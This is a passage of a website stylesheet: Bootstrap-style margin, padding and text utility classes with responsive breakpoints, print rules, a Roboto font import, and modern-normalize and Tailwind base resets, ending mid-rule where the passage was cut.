    .pl-2,
    .px-2 {
      padding-left: .5rem !important
    }

    .p-3 {
      padding: 1rem !important
    }

    .pt-3,
    .py-3 {
      padding-top: 1rem !important
    }

    .pr-3,
    .px-3 {
      padding-right: 1rem !important
    }

    .pb-3,
    .py-3 {
      padding-bottom: 1rem !important
    }

    .pl-3,
    .px-3 {
      padding-left: 1rem !important
    }

    .p-4 {
      padding: 1.5rem !important
    }

    .pt-4,
    .py-4 {
      padding-top: 1.5rem !important
    }

    .pr-4,
    .px-4 {
      padding-right: 1.5rem !important
    }

    .pb-4,
    .py-4 {
      padding-bottom: 1.5rem !important
    }

    .pl-4,
    .px-4 {
      padding-left: 1.5rem !important
    }

    .p-5 {
      padding: 3rem !important
    }

    .pt-5,
    .py-5 {
      padding-top: 3rem !important
    }

    .pr-5,
    .px-5 {
      padding-right: 3rem !important
    }

    .pb-5,
    .py-5 {
      padding-bottom: 3rem !important
    }

    .pl-5,
    .px-5 {
      padding-left: 3rem !important
    }

    .m-auto {
      margin: auto !important
    }

    .mt-auto,
    .my-auto {
      margin-top: auto !important
    }

    .mr-auto,
    .mx-auto {
      margin-right: auto !important
    }

    .mb-auto,
    .my-auto {
      margin-bottom: auto !important
    }

    .ml-auto,
    .mx-auto {
      margin-left: auto !important
    }

    @media (min-width:576px) {
      .m-sm-0 {
        margin: 0 !important
      }

      .mt-sm-0,
      .my-sm-0 {
        margin-top: 0 !important
      }

      .mr-sm-0,
      .mx-sm-0 {
        margin-right: 0 !important
      }

      .mb-sm-0,
      .my-sm-0 {
        margin-bottom: 0 !important
      }

      .ml-sm-0,
      .mx-sm-0 {
        margin-left: 0 !important
      }

      .m-sm-1 {
        margin: .25rem !important
      }

      .mt-sm-1,
      .my-sm-1 {
        margin-top: .25rem !important
      }

      .mr-sm-1,
      .mx-sm-1 {
        margin-right: .25rem !important
      }

      .mb-sm-1,
      .my-sm-1 {
        margin-bottom: .25rem !important
      }

      .ml-sm-1,
      .mx-sm-1 {
        margin-left: .25rem !important
      }

      .m-sm-2 {
        margin: .5rem !important
      }

      .mt-sm-2,
      .my-sm-2 {
        margin-top: .5rem !important
      }

      .mr-sm-2,
      .mx-sm-2 {
        margin-right: .5rem !important
      }

      .mb-sm-2,
      .my-sm-2 {
        margin-bottom: .5rem !important
      }

      .ml-sm-2,
      .mx-sm-2 {
        margin-left: .5rem !important
      }

      .m-sm-3 {
        margin: 1rem !important
      }

      .mt-sm-3,
      .my-sm-3 {
        margin-top: 1rem !important
      }

      .mr-sm-3,
      .mx-sm-3 {
        margin-right: 1rem !important
      }

      .mb-sm-3,
      .my-sm-3 {
        margin-bottom: 1rem !important
      }

      .ml-sm-3,
      .mx-sm-3 {
        margin-left: 1rem !important
      }

      .m-sm-4 {
        margin: 1.5rem !important
      }

      .mt-sm-4,
      .my-sm-4 {
        margin-top: 1.5rem !important
      }

      .mr-sm-4,
      .mx-sm-4 {
        margin-right: 1.5rem !important
      }

      .mb-sm-4,
      .my-sm-4 {
        margin-bottom: 1.5rem !important
      }

      .ml-sm-4,
      .mx-sm-4 {
        margin-left: 1.5rem !important
      }

      .m-sm-5 {
        margin: 3rem !important
      }

      .mt-sm-5,
      .my-sm-5 {
        margin-top: 3rem !important
      }

      .mr-sm-5,
      .mx-sm-5 {
        margin-right: 3rem !important
      }

      .mb-sm-5,
      .my-sm-5 {
        margin-bottom: 3rem !important
      }

      .ml-sm-5,
      .mx-sm-5 {
        margin-left: 3rem !important
      }

      .p-sm-0 {
        padding: 0 !important
      }

      .pt-sm-0,
      .py-sm-0 {
        padding-top: 0 !important
      }

      .pr-sm-0,
      .px-sm-0 {
        padding-right: 0 !important
      }

      .pb-sm-0,
      .py-sm-0 {
        padding-bottom: 0 !important
      }

      .pl-sm-0,
      .px-sm-0 {
        padding-left: 0 !important
      }

      .p-sm-1 {
        padding: .25rem !important
      }

      .pt-sm-1,
      .py-sm-1 {
        padding-top: .25rem !important
      }

      .pr-sm-1,
      .px-sm-1 {
        padding-right: .25rem !important
      }

      .pb-sm-1,
      .py-sm-1 {
        padding-bottom: .25rem !important
      }

      .pl-sm-1,
      .px-sm-1 {
        padding-left: .25rem !important
      }

      .p-sm-2 {
        padding: .5rem !important
      }

      .pt-sm-2,
      .py-sm-2 {
        padding-top: .5rem !important
      }

      .pr-sm-2,
      .px-sm-2 {
        padding-right: .5rem !important
      }

      .pb-sm-2,
      .py-sm-2 {
        padding-bottom: .5rem !important
      }

      .pl-sm-2,
      .px-sm-2 {
        padding-left: .5rem !important
      }

      .p-sm-3 {
        padding: 1rem !important
      }

      .pt-sm-3,
      .py-sm-3 {
        padding-top: 1rem !important
      }

      .pr-sm-3,
      .px-sm-3 {
        padding-right: 1rem !important
      }

      .pb-sm-3,
      .py-sm-3 {
        padding-bottom: 1rem !important
      }

      .pl-sm-3,
      .px-sm-3 {
        padding-left: 1rem !important
      }

      .p-sm-4 {
        padding: 1.5rem !important
      }

      .pt-sm-4,
      .py-sm-4 {
        padding-top: 1.5rem !important
      }

      .pr-sm-4,
      .px-sm-4 {
        padding-right: 1.5rem !important
      }

      .pb-sm-4,
      .py-sm-4 {
        padding-bottom: 1.5rem !important
      }

      .pl-sm-4,
      .px-sm-4 {
        padding-left: 1.5rem !important
      }

      .p-sm-5 {
        padding: 3rem !important
      }

      .pt-sm-5,
      .py-sm-5 {
        padding-top: 3rem !important
      }

      .pr-sm-5,
      .px-sm-5 {
        padding-right: 3rem !important
      }

      .pb-sm-5,
      .py-sm-5 {
        padding-bottom: 3rem !important
      }

      .pl-sm-5,
      .px-sm-5 {
        padding-left: 3rem !important
      }

      .m-sm-auto {
        margin: auto !important
      }

      .mt-sm-auto,
      .my-sm-auto {
        margin-top: auto !important
      }

      .mr-sm-auto,
      .mx-sm-auto {
        margin-right: auto !important
      }

      .mb-sm-auto,
      .my-sm-auto {
        margin-bottom: auto !important
      }

      .ml-sm-auto,
      .mx-sm-auto {
        margin-left: auto !important
      }
    }

    @media (min-width:768px) {
      .m-md-0 {
        margin: 0 !important
      }

      .mt-md-0,
      .my-md-0 {
        margin-top: 0 !important
      }

      .mr-md-0,
      .mx-md-0 {
        margin-right: 0 !important
      }

      .mb-md-0,
      .my-md-0 {
        margin-bottom: 0 !important
      }

      .ml-md-0,
      .mx-md-0 {
        margin-left: 0 !important
      }

      .m-md-1 {
        margin: .25rem !important
      }

      .mt-md-1,
      .my-md-1 {
        margin-top: .25rem !important
      }

      .mr-md-1,
      .mx-md-1 {
        margin-right: .25rem !important
      }

      .mb-md-1,
      .my-md-1 {
        margin-bottom: .25rem !important
      }

      .ml-md-1,
      .mx-md-1 {
        margin-left: .25rem !important
      }

      .m-md-2 {
        margin: .5rem !important
      }

      .mt-md-2,
      .my-md-2 {
        margin-top: .5rem !important
      }

      .mr-md-2,
      .mx-md-2 {
        margin-right: .5rem !important
      }

      .mb-md-2,
      .my-md-2 {
        margin-bottom: .5rem !important
      }

      .ml-md-2,
      .mx-md-2 {
        margin-left: .5rem !important
      }

      .m-md-3 {
        margin: 1rem !important
      }

      .mt-md-3,
      .my-md-3 {
        margin-top: 1rem !important
      }

      .mr-md-3,
      .mx-md-3 {
        margin-right: 1rem !important
      }

      .mb-md-3,
      .my-md-3 {
        margin-bottom: 1rem !important
      }

      .ml-md-3,
      .mx-md-3 {
        margin-left: 1rem !important
      }

      .m-md-4 {
        margin: 1.5rem !important
      }

      .mt-md-4,
      .my-md-4 {
        margin-top: 1.5rem !important
      }

      .mr-md-4,
      .mx-md-4 {
        margin-right: 1.5rem !important
      }

      .mb-md-4,
      .my-md-4 {
        margin-bottom: 1.5rem !important
      }

      .ml-md-4,
      .mx-md-4 {
        margin-left: 1.5rem !important
      }

      .m-md-5 {
        margin: 3rem !important
      }

      .mt-md-5,
      .my-md-5 {
        margin-top: 3rem !important
      }

      .mr-md-5,
      .mx-md-5 {
        margin-right: 3rem !important
      }

      .mb-md-5,
      .my-md-5 {
        margin-bottom: 3rem !important
      }

      .ml-md-5,
      .mx-md-5 {
        margin-left: 3rem !important
      }

      .p-md-0 {
        padding: 0 !important
      }

      .pt-md-0,
      .py-md-0 {
        padding-top: 0 !important
      }

      .pr-md-0,
      .px-md-0 {
        padding-right: 0 !important
      }

      .pb-md-0,
      .py-md-0 {
        padding-bottom: 0 !important
      }

      .pl-md-0,
      .px-md-0 {
        padding-left: 0 !important
      }

      .p-md-1 {
        padding: .25rem !important
      }

      .pt-md-1,
      .py-md-1 {
        padding-top: .25rem !important
      }

      .pr-md-1,
      .px-md-1 {
        padding-right: .25rem !important
      }

      .pb-md-1,
      .py-md-1 {
        padding-bottom: .25rem !important
      }

      .pl-md-1,
      .px-md-1 {
        padding-left: .25rem !important
      }

      .p-md-2 {
        padding: .5rem !important
      }

      .pt-md-2,
      .py-md-2 {
        padding-top: .5rem !important
      }

      .pr-md-2,
      .px-md-2 {
        padding-right: .5rem !important
      }

      .pb-md-2,
      .py-md-2 {
        padding-bottom: .5rem !important
      }

      .pl-md-2,
      .px-md-2 {
        padding-left: .5rem !important
      }

      .p-md-3 {
        padding: 1rem !important
      }

      .pt-md-3,
      .py-md-3 {
        padding-top: 1rem !important
      }

      .pr-md-3,
      .px-md-3 {
        padding-right: 1rem !important
      }

      .pb-md-3,
      .py-md-3 {
        padding-bottom: 1rem !important
      }

      .pl-md-3,
      .px-md-3 {
        padding-left: 1rem !important
      }

      .p-md-4 {
        padding: 1.5rem !important
      }

      .pt-md-4,
      .py-md-4 {
        padding-top: 1.5rem !important
      }

      .pr-md-4,
      .px-md-4 {
        padding-right: 1.5rem !important
      }

      .pb-md-4,
      .py-md-4 {
        padding-bottom: 1.5rem !important
      }

      .pl-md-4,
      .px-md-4 {
        padding-left: 1.5rem !important
      }

      .p-md-5 {
        padding: 3rem !important
      }

      .pt-md-5,
      .py-md-5 {
        padding-top: 3rem !important
      }

      .pr-md-5,
      .px-md-5 {
        padding-right: 3rem !important
      }

      .pb-md-5,
      .py-md-5 {
        padding-bottom: 3rem !important
      }

      .pl-md-5,
      .px-md-5 {
        padding-left: 3rem !important
      }

      .m-md-auto {
        margin: auto !important
      }

      .mt-md-auto,
      .my-md-auto {
        margin-top: auto !important
      }

      .mr-md-auto,
      .mx-md-auto {
        margin-right: auto !important
      }

      .mb-md-auto,
      .my-md-auto {
        margin-bottom: auto !important
      }

      .ml-md-auto,
      .mx-md-auto {
        margin-left: auto !important
      }
    }

    @media (min-width:992px) {
      .m-lg-0 {
        margin: 0 !important
      }

      .mt-lg-0,
      .my-lg-0 {
        margin-top: 0 !important
      }

      .mr-lg-0,
      .mx-lg-0 {
        margin-right: 0 !important
      }

      .mb-lg-0,
      .my-lg-0 {
        margin-bottom: 0 !important
      }

      .ml-lg-0,
      .mx-lg-0 {
        margin-left: 0 !important
      }

      .m-lg-1 {
        margin: .25rem !important
      }

      .mt-lg-1,
      .my-lg-1 {
        margin-top: .25rem !important
      }

      .mr-lg-1,
      .mx-lg-1 {
        margin-right: .25rem !important
      }

      .mb-lg-1,
      .my-lg-1 {
        margin-bottom: .25rem !important
      }

      .ml-lg-1,
      .mx-lg-1 {
        margin-left: .25rem !important
      }

      .m-lg-2 {
        margin: .5rem !important
      }

      .mt-lg-2,
      .my-lg-2 {
        margin-top: .5rem !important
      }

      .mr-lg-2,
      .mx-lg-2 {
        margin-right: .5rem !important
      }

      .mb-lg-2,
      .my-lg-2 {
        margin-bottom: .5rem !important
      }

      .ml-lg-2,
      .mx-lg-2 {
        margin-left: .5rem !important
      }

      .m-lg-3 {
        margin: 1rem !important
      }

      .mt-lg-3,
      .my-lg-3 {
        margin-top: 1rem !important
      }

      .mr-lg-3,
      .mx-lg-3 {
        margin-right: 1rem !important
      }

      .mb-lg-3,
      .my-lg-3 {
        margin-bottom: 1rem !important
      }

      .ml-lg-3,
      .mx-lg-3 {
        margin-left: 1rem !important
      }

      .m-lg-4 {
        margin: 1.5rem !important
      }

      .mt-lg-4,
      .my-lg-4 {
        margin-top: 1.5rem !important
      }

      .mr-lg-4,
      .mx-lg-4 {
        margin-right: 1.5rem !important
      }

      .mb-lg-4,
      .my-lg-4 {
        margin-bottom: 1.5rem !important
      }

      .ml-lg-4,
      .mx-lg-4 {
        margin-left: 1.5rem !important
      }

      .m-lg-5 {
        margin: 3rem !important
      }

      .mt-lg-5,
      .my-lg-5 {
        margin-top: 3rem !important
      }

      .mr-lg-5,
      .mx-lg-5 {
        margin-right: 3rem !important
      }

      .mb-lg-5,
      .my-lg-5 {
        margin-bottom: 3rem !important
      }

      .ml-lg-5,
      .mx-lg-5 {
        margin-left: 3rem !important
      }

      .p-lg-0 {
        padding: 0 !important
      }

      .pt-lg-0,
      .py-lg-0 {
        padding-top: 0 !important
      }

      .pr-lg-0,
      .px-lg-0 {
        padding-right: 0 !important
      }

      .pb-lg-0,
      .py-lg-0 {
        padding-bottom: 0 !important
      }

      .pl-lg-0,
      .px-lg-0 {
        padding-left: 0 !important
      }

      .p-lg-1 {
        padding: .25rem !important
      }

      .pt-lg-1,
      .py-lg-1 {
        padding-top: .25rem !important
      }

      .pr-lg-1,
      .px-lg-1 {
        padding-right: .25rem !important
      }

      .pb-lg-1,
      .py-lg-1 {
        padding-bottom: .25rem !important
      }

      .pl-lg-1,
      .px-lg-1 {
        padding-left: .25rem !important
      }

      .p-lg-2 {
        padding: .5rem !important
      }

      .pt-lg-2,
      .py-lg-2 {
        padding-top: .5rem !important
      }

      .pr-lg-2,
      .px-lg-2 {
        padding-right: .5rem !important
      }

      .pb-lg-2,
      .py-lg-2 {
        padding-bottom: .5rem !important
      }

      .pl-lg-2,
      .px-lg-2 {
        padding-left: .5rem !important
      }

      .p-lg-3 {
        padding: 1rem !important
      }

      .pt-lg-3,
      .py-lg-3 {
        padding-top: 1rem !important
      }

      .pr-lg-3,
      .px-lg-3 {
        padding-right: 1rem !important
      }

      .pb-lg-3,
      .py-lg-3 {
        padding-bottom: 1rem !important
      }

      .pl-lg-3,
      .px-lg-3 {
        padding-left: 1rem !important
      }

      .p-lg-4 {
        padding: 1.5rem !important
      }

      .pt-lg-4,
      .py-lg-4 {
        padding-top: 1.5rem !important
      }

      .pr-lg-4,
      .px-lg-4 {
        padding-right: 1.5rem !important
      }

      .pb-lg-4,
      .py-lg-4 {
        padding-bottom: 1.5rem !important
      }

      .pl-lg-4,
      .px-lg-4 {
        padding-left: 1.5rem !important
      }

      .p-lg-5 {
        padding: 3rem !important
      }

      .pt-lg-5,
      .py-lg-5 {
        padding-top: 3rem !important
      }

      .pr-lg-5,
      .px-lg-5 {
        padding-right: 3rem !important
      }

      .pb-lg-5,
      .py-lg-5 {
        padding-bottom: 3rem !important
      }

      .pl-lg-5,
      .px-lg-5 {
        padding-left: 3rem !important
      }

      .m-lg-auto {
        margin: auto !important
      }

      .mt-lg-auto,
      .my-lg-auto {
        margin-top: auto !important
      }

      .mr-lg-auto,
      .mx-lg-auto {
        margin-right: auto !important
      }

      .mb-lg-auto,
      .my-lg-auto {
        margin-bottom: auto !important
      }

      .ml-lg-auto,
      .mx-lg-auto {
        margin-left: auto !important
      }
    }

    @media (min-width:1200px) {
      .m-xl-0 {
        margin: 0 !important
      }

      .mt-xl-0,
      .my-xl-0 {
        margin-top: 0 !important
      }

      .mr-xl-0,
      .mx-xl-0 {
        margin-right: 0 !important
      }

      .mb-xl-0,
      .my-xl-0 {
        margin-bottom: 0 !important
      }

      .ml-xl-0,
      .mx-xl-0 {
        margin-left: 0 !important
      }

      .m-xl-1 {
        margin: .25rem !important
      }

      .mt-xl-1,
      .my-xl-1 {
        margin-top: .25rem !important
      }

      .mr-xl-1,
      .mx-xl-1 {
        margin-right: .25rem !important
      }

      .mb-xl-1,
      .my-xl-1 {
        margin-bottom: .25rem !important
      }

      .ml-xl-1,
      .mx-xl-1 {
        margin-left: .25rem !important
      }

      .m-xl-2 {
        margin: .5rem !important
      }

      .mt-xl-2,
      .my-xl-2 {
        margin-top: .5rem !important
      }

      .mr-xl-2,
      .mx-xl-2 {
        margin-right: .5rem !important
      }

      .mb-xl-2,
      .my-xl-2 {
        margin-bottom: .5rem !important
      }

      .ml-xl-2,
      .mx-xl-2 {
        margin-left: .5rem !important
      }

      .m-xl-3 {
        margin: 1rem !important
      }

      .mt-xl-3,
      .my-xl-3 {
        margin-top: 1rem !important
      }

      .mr-xl-3,
      .mx-xl-3 {
        margin-right: 1rem !important
      }

      .mb-xl-3,
      .my-xl-3 {
        margin-bottom: 1rem !important
      }

      .ml-xl-3,
      .mx-xl-3 {
        margin-left: 1rem !important
      }

      .m-xl-4 {
        margin: 1.5rem !important
      }

      .mt-xl-4,
      .my-xl-4 {
        margin-top: 1.5rem !important
      }

      .mr-xl-4,
      .mx-xl-4 {
        margin-right: 1.5rem !important
      }

      .mb-xl-4,
      .my-xl-4 {
        margin-bottom: 1.5rem !important
      }

      .ml-xl-4,
      .mx-xl-4 {
        margin-left: 1.5rem !important
      }

      .m-xl-5 {
        margin: 3rem !important
      }

      .mt-xl-5,
      .my-xl-5 {
        margin-top: 3rem !important
      }

      .mr-xl-5,
      .mx-xl-5 {
        margin-right: 3rem !important
      }

      .mb-xl-5,
      .my-xl-5 {
        margin-bottom: 3rem !important
      }

      .ml-xl-5,
      .mx-xl-5 {
        margin-left: 3rem !important
      }

      .p-xl-0 {
        padding: 0 !important
      }

      .pt-xl-0,
      .py-xl-0 {
        padding-top: 0 !important
      }

      .pr-xl-0,
      .px-xl-0 {
        padding-right: 0 !important
      }

      .pb-xl-0,
      .py-xl-0 {
        padding-bottom: 0 !important
      }

      .pl-xl-0,
      .px-xl-0 {
        padding-left: 0 !important
      }

      .p-xl-1 {
        padding: .25rem !important
      }

      .pt-xl-1,
      .py-xl-1 {
        padding-top: .25rem !important
      }

      .pr-xl-1,
      .px-xl-1 {
        padding-right: .25rem !important
      }

      .pb-xl-1,
      .py-xl-1 {
        padding-bottom: .25rem !important
      }

      .pl-xl-1,
      .px-xl-1 {
        padding-left: .25rem !important
      }

      .p-xl-2 {
        padding: .5rem !important
      }

      .pt-xl-2,
      .py-xl-2 {
        padding-top: .5rem !important
      }

      .pr-xl-2,
      .px-xl-2 {
        padding-right: .5rem !important
      }

      .pb-xl-2,
      .py-xl-2 {
        padding-bottom: .5rem !important
      }

      .pl-xl-2,
      .px-xl-2 {
        padding-left: .5rem !important
      }

      .p-xl-3 {
        padding: 1rem !important
      }

      .pt-xl-3,
      .py-xl-3 {
        padding-top: 1rem !important
      }

      .pr-xl-3,
      .px-xl-3 {
        padding-right: 1rem !important
      }

      .pb-xl-3,
      .py-xl-3 {
        padding-bottom: 1rem !important
      }

      .pl-xl-3,
      .px-xl-3 {
        padding-left: 1rem !important
      }

      .p-xl-4 {
        padding: 1.5rem !important
      }

      .pt-xl-4,
      .py-xl-4 {
        padding-top: 1.5rem !important
      }

      .pr-xl-4,
      .px-xl-4 {
        padding-right: 1.5rem !important
      }

      .pb-xl-4,
      .py-xl-4 {
        padding-bottom: 1.5rem !important
      }

      .pl-xl-4,
      .px-xl-4 {
        padding-left: 1.5rem !important
      }

      .p-xl-5 {
        padding: 3rem !important
      }

      .pt-xl-5,
      .py-xl-5 {
        padding-top: 3rem !important
      }

      .pr-xl-5,
      .px-xl-5 {
        padding-right: 3rem !important
      }

      .pb-xl-5,
      .py-xl-5 {
        padding-bottom: 3rem !important
      }

      .pl-xl-5,
      .px-xl-5 {
        padding-left: 3rem !important
      }

      .m-xl-auto {
        margin: auto !important
      }

      .mt-xl-auto,
      .my-xl-auto {
        margin-top: auto !important
      }

      .mr-xl-auto,
      .mx-xl-auto {
        margin-right: auto !important
      }

      .mb-xl-auto,
      .my-xl-auto {
        margin-bottom: auto !important
      }

      .ml-xl-auto,
      .mx-xl-auto {
        margin-left: auto !important
      }
    }

    .text-monospace {
      font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace
    }

    .text-justify {
      text-align: justify !important
    }

    .text-nowrap {
      white-space: nowrap !important
    }

    .text-truncate {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap
    }

    .text-left {
      text-align: left !important
    }

    .text-right {
      text-align: right !important
    }

    .text-center {
      text-align: center !important
    }

    @media (min-width:576px) {
      .text-sm-left {
        text-align: left !important
      }

      .text-sm-right {
        text-align: right !important
      }

      .text-sm-center {
        text-align: center !important
      }
    }

    @media (min-width:768px) {
      .text-md-left {
        text-align: left !important
      }

      .text-md-right {
        text-align: right !important
      }

      .text-md-center {
        text-align: center !important
      }
    }

    @media (min-width:992px) {
      .text-lg-left {
        text-align: left !important
      }

      .text-lg-right {
        text-align: right !important
      }

      .text-lg-center {
        text-align: center !important
      }
    }

    @media (min-width:1200px) {
      .text-xl-left {
        text-align: left !important
      }

      .text-xl-right {
        text-align: right !important
      }

      .text-xl-center {
        text-align: center !important
      }
    }

    .text-lowercase {
      text-transform: lowercase !important
    }

    .text-uppercase {
      text-transform: uppercase !important
    }

    .text-capitalize {
      text-transform: capitalize !important
    }

    .font-weight-light {
      font-weight: 300 !important
    }

    .font-weight-normal {
      font-weight: 400 !important
    }

    .font-weight-bold {
      font-weight: 700 !important
    }

    .font-italic {
      font-style: italic !important
    }

    .text-white {
      color: #fff !important
    }

    .text-primary {
      color: #007bff !important
    }

    a.text-primary:focus,
    a.text-primary:hover {
      color: #0062cc !important
    }

    .text-secondary {
      color: #6c757d !important
    }

    a.text-secondary:focus,
    a.text-secondary:hover {
      color: #545b62 !important
    }

    .text-success {
      color: #28a745 !important
    }

    a.text-success:focus,
    a.text-success:hover {
      color: #1e7e34 !important
    }

    .text-info {
      color: #17a2b8 !important
    }

    a.text-info:focus,
    a.text-info:hover {
      color: #117a8b !important
    }

    .text-warning {
      color: #ffc107 !important
    }

    a.text-warning:focus,
    a.text-warning:hover {
      color: #d39e00 !important
    }

    .text-danger {
      color: #dc3545 !important
    }

    a.text-danger:focus,
    a.text-danger:hover {
      color: #bd2130 !important
    }

    .text-light {
      color: #f8f9fa !important
    }

    a.text-light:focus,
    a.text-light:hover {
      color: #dae0e5 !important
    }

    .text-dark {
      color: #343a40 !important
    }

    a.text-dark:focus,
    a.text-dark:hover {
      color: #1d2124 !important
    }

    .text-body {
      color: #212529 !important
    }

    .text-muted {
      color: #6c757d !important
    }

    .text-black-50 {
      color: rgba(0, 0, 0, .5) !important
    }

    .text-white-50 {
      color: rgba(255, 255, 255, .5) !important
    }

    .text-hide {
      font: 0/0 a;
      color: transparent;
      text-shadow: none;
      background-color: transparent;
      border: 0
    }

    .visible {
      visibility: visible !important
    }

    .invisible {
      visibility: hidden !important
    }

    @media print {

      *,
      ::after,
      ::before {
        text-shadow: none !important;
        box-shadow: none !important
      }

      a:not(.btn) {
        text-decoration: underline
      }

      abbr[title]::after {
        content: " ("attr(title) ")"
      }

      pre {
        white-space: pre-wrap !important
      }

      blockquote,
      pre {
        border: 1px solid #adb5bd;
        page-break-inside: avoid
      }

      thead {
        display: table-header-group
      }

      img,
      tr {
        page-break-inside: avoid
      }

      h2,
      h3,
      p {
        orphans: 3;
        widows: 3
      }

      h2,
      h3 {
        page-break-after: avoid
      }

      @page {
        size: a3
      }

      body {
        min-width: 992px !important
      }

      .container {
        min-width: 992px !important
      }

      .navbar {
        display: none
      }

      .badge {
        border: 1px solid #000
      }

      .table {
        border-collapse: collapse !important
      }

      .table td,
      .table th {
        background-color: #fff !important
      }

      .table-bordered td,
      .table-bordered th {
        border: 1px solid #dee2e6 !important
      }

      .table-dark {
        color: inherit
      }

      .table-dark tbody+tbody,
      .table-dark td,
      .table-dark th,
      .table-dark thead th {
        border-color: #dee2e6
      }

      .table .thead-dark th {
        color: inherit;
        border-color: #dee2e6
      }
    }

    @import url(https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap);

    /* ! tailwindcss v2.0.4 | MIT License | https://tailwindcss.com */

    /*! modern-normalize v1.0.0 | MIT License | https://github.com/sindresorhus/modern-normalize */
    :root {
      -moz-tab-size: 4;
      -o-tab-size: 4;
      tab-size: 4
    }

    html {
      line-height: 1.15;
      -webkit-text-size-adjust: 100%
    }

    body {
      margin: 0;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji
    }

    hr {
      height: 0;
      color: inherit
    }

    abbr[title] {
      -webkit-text-decoration: underline dotted;
      text-decoration: underline dotted
    }

    b,
    strong {
      font-weight: bolder
    }

    code,
    kbd,
    pre,
    samp {
      font-family: ui-monospace, SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
      font-size: 1em
    }

    small {
      font-size: 80%
    }

    sub,
    sup {
      font-size: 75%;
      line-height: 0;
      position: relative;
      vertical-align: baseline
    }

    sub {
      bottom: -.25em
    }

    sup {
      top: -.5em
    }

    table {
      text-indent: 0;
      border-color: inherit
    }

    button,
    input,
    optgroup,
    select,
    textarea {
      font-family: inherit;
      font-size: 100%;
      line-height: 1.15;
      margin: 0
    }

    button,
    select {
      text-transform: none
    }

    [type=button],
    button {
      -webkit-appearance: button
    }

    legend {
      padding: 0
    }

    progress {
      vertical-align: baseline
    }

    summary {
      display: list-item
    }

    blockquote,
    dd,
    dl,
    figure,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    hr,
    p,
    pre {
      margin: 0
    }

    button {
      background-color: transparent;
      background-image: none
    }

    button:focus {
      outline: 1px dotted;
      outline: 5px auto -webkit-focus-ring-color
    }

    fieldset,
    ol,
    ul {
      margin: 0;
      padding: 0
    }

    ol,
    ul {
      list-style: none
    }

    html {
      font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
      line-height: 1.5
    }

    body {
      font-family: inherit;
      line-height: inherit
    }

    *,
    :after,
    :before {
      box-sizing: border-box;
      border: 0 solid #e5e7eb
    }

    hr {
      border-top-width: 1px
    }

    img {
      border-style: solid
    }

    textarea {
      resize: vertical
    }

    input::-moz-placeholder,
    textarea::-moz-placeholder {
      opacity: 1;
      color: #9fa6b2
    }

    input:-ms-input-placeholder,
    textarea:-ms-input-placeholder {
      opacity: 1;
      color: #9fa6b2
    }

    input::placeholder,
    textarea::placeholder {
      opacity: 1;
      color: #9fa6b2
    }

    [role=button],
    button {
      cursor: pointer
    }

    table {
      border-collapse: collapse
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
      font-size: inherit;
      font-weight: inherit
    }

    a {
      color: inherit;
      text-decoration: inherit
    }

    button,
    input,
    optgroup,
    select,
    textarea {
      padding: 0;
      line-height: inherit;
      color: inherit
    }

    code,
    kbd,
    pre,
    samp {
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, Liberation Mono, Courier New, monospace
    }

    audio,
    canvas,
    embed,
    iframe,
    img,
    object,
    svg,
    video {
      display: block;
      vertical-align: middle
    }

    img,
    video {
      max-width: 100%;
      height: auto
    }

    .space-y-6>:not([hidden])~:not([hidden]) {
      --tw-space-y-reverse: 0;
      margin-top: calc(1.5rem * calc(1 - var(--tw-space-y-reverse)));
      margin-bottom: calc(1.5rem * var(--tw-space-y-reverse))
    }

    .space-y-10>:not([hidden])~:not([hidden]) {
      --tw-space-y-reverse: 0;
      margin-top: calc(2.5rem * calc(1 - var(--tw-space-y-reverse)));
      margin-bottom: calc(2.5rem * var(--tw-space-y-reverse))
    }

    .bg-white {
      --tw-bg-opacity: 1;
      background-color: rgba(255, 255, 255, var(--tw-bg-opacity))
    }

    .bg-red-100 {
      --tw-bg-opacity: 1;
      background-color: rgba(253, 232, 232, var(--tw-bg-opacity))
    }

    .bg-red-500 {
      --tw-bg-opacity: 1;
      background-color: rgba(240, 82, 82, var(--tw-bg-opacity))
    }

    .border-red-400 {
      --tw-border-opacity: 1;
      border-color: rgba(249, 128, 128, var(--tw-border-opacity))
    }

    .rounded-full {
      border-radius: 9999px
    }

    .rounded-t {
      border-top-left-radius: .25rem;
      border-top-right-radius: .25rem
    }

    .rounded-b {
      border-bottom-right-radius: .25rem;
      border-bottom-left-radius: .25rem
    }

    .border {
      border-width: 1px
    }

    .border-t-0 {
      border-top-width: 0
    }

    .cursor-pointer {
      cursor: pointer
    }

    .inline-block {
      display: inline-block
    }

    .flex {
      display: flex
    }

    .table {
      display: table
    }

    .grid {
      display: grid
    }

    .contents {
      display: contents
    }

    .flex-col {
      flex-direction: column
    }

    .items-center {
      align-items: center
    }

    .justify-center {
      justify-content: center
    }

    .justify-between {
      justify-content: space-between
    }

    .justify-around {
      justify-content: space-around
    }

    .font-thin {
      font-weight: 100
    }

    .font-medium {
      font-weight: 500
    }

    .font-semibold {
      font-weight: 600
    }

    .font-bold {
      font-weight: 700
    }

    .text-sm {
      font-size: .875rem;
      line-height: 1.25rem
    }

    .text-lg {
      font-size: 1.125rem;
      line-height: 1.75rem
    }

    .text-2xl {
      font-size: 1.5rem;
      line-height: 2rem
    }

    .text-3xl {
      font-size: 1.875rem;
      line-height: 2.25rem
    }

    .text-4xl {
      font-size: 2.25rem;
      line-height: 2.5rem
    }

    .leading-6 {
      line-height: 1.5rem
    }

    .mx-6 {
      margin-left: 1.5rem;
      margin-right: 1.5rem
    }

    .mx-8 {
      margin-left: 2rem;
      margin-right: 2rem
    }

    .mt-2 {
      margin-top: .5rem
    }

    .ml-2 {
      margin-left: .5rem
    }

    .mt-4 {
      margin-top: 1rem
    }

    .mt-6 {
      margin-top: 1.5rem
    }

    .mt-8 {
      margin-top: 2rem
    }

    .mt-10 {
      margin-top: 2.5rem
    }

    .mt-12 {
